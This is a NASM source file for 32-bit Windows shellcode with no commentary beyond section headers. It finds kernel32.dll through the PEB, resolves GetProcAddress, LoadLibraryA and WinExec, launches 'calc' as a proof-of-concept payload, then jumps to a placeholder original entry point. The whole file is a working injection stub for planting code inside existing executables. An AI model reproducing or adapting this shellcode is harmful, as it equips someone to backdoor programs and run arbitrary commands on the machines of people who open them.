; NASM

[bits 32]

; =========================================================== ;
;                  KERNEL32.dll Base Address                  ;
; =========================================================== ;
xor   ecx, ecx
mov   eax, [FS:ecx + 0x30]
mov   eax, [eax + 0x0C]
mov   eax, [eax + 0x1C]
mov   eax, [eax + ecx]
mov   eax, [eax + ecx]
mov   ebx, [eax + 8]

; =========================================================== ;
;                  KERNEL32.dll Export Table                  ;
; =========================================================== ;
mov   edx, [ebx + 0x3c]
add   edx, ebx
mov   edx, [edx + 0x78]
add   edx, ebx
mov   esi, [edx + 0x20]
add   esi, ebx

; ============================================================ ;
;                 GetProcAddress Function Name                 ;
; ============================================================ ;
Find_GetProc:

	inc   ecx
	lodsd
	add   eax, ebx
	cmp   dword [eax], 0x50746547
	jnz   Find_GetProc
	cmp   dword [eax + 0x4], 0x41636f72
	jnz   Find_GetProc
	cmp   dword [eax + 0x8], 0x65726464
	jnz   Find_GetProc
	dec   ecx

; =========================================================== ;
;                GetProcAddress Function Address              ;
; =========================================================== ;
mov   esi, [edx + 0x24]
add   esi, ebx
mov   cx,  [esi + ecx * 2]
mov   esi, [edx + 0x1c]
add   esi, ebx
mov   edx, [esi + ecx * 4]
add   edx, ebx
mov   esi, edx

xor   ecx,ecx
push  ecx
 
push  0x41797261
push  0x7262694c
push  0x64616f4c
 
push  esp
push  ebx ;address of kernel32.dll
 
call  edx 

; =========================================================== ;
;                   WinExec Function Address                  ;
; =========================================================== ;
xor   ecx, ecx
push  ecx
			
push  0x63657845
push  0x6e695741
mov   ecx, esp
lea   ecx, [ecx + 1]
push  ecx
push  ebx

call  esi
mov   esi, eax

nop

; =========================================================== ;
;          Reversed Null Terminated String lpCmdLine          ;
; =========================================================== ;

xor   ecx, ecx
push  ecx
push  0x636C6163 ; calc
mov   ecx, esp
xor   eax, eax
push  eax
push  ecx
call  esi

; =========================================================== ;
;                     Original Entry Point                    ;
; =========================================================== ;
push  0xAAAAAAAA ; OEP Placeholder
ret
